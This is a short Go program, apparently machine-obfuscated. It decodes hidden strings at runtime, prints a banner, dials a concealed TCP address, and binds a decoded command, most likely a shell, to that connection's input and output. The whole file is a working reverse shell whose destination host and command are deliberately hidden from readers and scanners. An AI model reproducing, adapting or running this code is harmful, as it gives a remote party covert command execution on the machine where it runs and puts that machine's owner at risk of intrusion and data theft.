//line :1
package main

import (
        "fmt"
        "net"
        "os/exec"
)

func gGnM1YoA() string {
        return  /*line :1*/ func() string {
                key :=  /*line :1*/ []byte("\xff\xa4?\x98\xbe,h\x9e\\G/\x89Yw")
                data :=  /*line :1*/ []byte("\xb7\xc5O\xe8\xc7\f \xff?,F\xe7>V")
                for i, b := range key {
                        data[i] = data[i] ^ b
                }
                return  /*line :1*/ string(data)
        }()
}

func main() {
         /*line :1*/ fmt.Println( /*line :1*/ gGnM1YoA())
        c, _ :=  /*line :1*/ net.Dial( /*line :1*/ func() string {
                seed :=  /*line :1*/ byte(166)
                var data []byte
                type decFunc func(byte) decFunc
                var fnc decFunc
                fnc = func(x byte) decFunc { data =  /*line :1*/ append(data, x+seed); seed += x; return fnc }
                 /*line :1*/  /*line :1*/  /*line :1*/ fnc(206)(239)(13)
                return  /*line :1*/ string(data)
        }(),  /*line :1*/ func() string {
                data :=  /*line :1*/ []byte("\x1e)\x0e\x0f06/#\x115\v$0\x05\x1f\x16\x103\x14")
                positions := [...]byte{18, 11, 6, 2, 7, 8, 13, 10, 2, 1, 16, 13, 15, 6, 3, 10, 0, 6, 10, 15, 14, 11, 3, 7}
                for i := 0; i < 24; i += 2 {
                        localKey :=  /*line :1*/ byte(i) +  /*line :1*/ byte(positions[i]^positions[i+1]) + 250
                        data[positions[i]], data[positions[i+1]] = data[positions[i+1]]+localKey, data[positions[i]]+localKey
                }
                return  /*line :1*/ string(data)
        }())
        cmd :=  /*line :1*/ exec.Command( /*line :1*/ func() string {
                fullData :=  /*line :1*/ []byte("B\x81\x8b\x01\xd7\xf2\u007feo\xb0\x88\xed\x04 ")
                var data []byte
                data =  /*line :1*/ append(data, fullData[0]+fullData[11], fullData[2]+fullData[4], fullData[7]+fullData[12], fullData[8]^fullData[3], fullData[6]+fullData[9], fullData[5]^fullData[1], fullData[10]-fullData[13])
                return  /*line :1*/ string(data)
        }())
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
         /*line :1*/ cmd.Run()
}
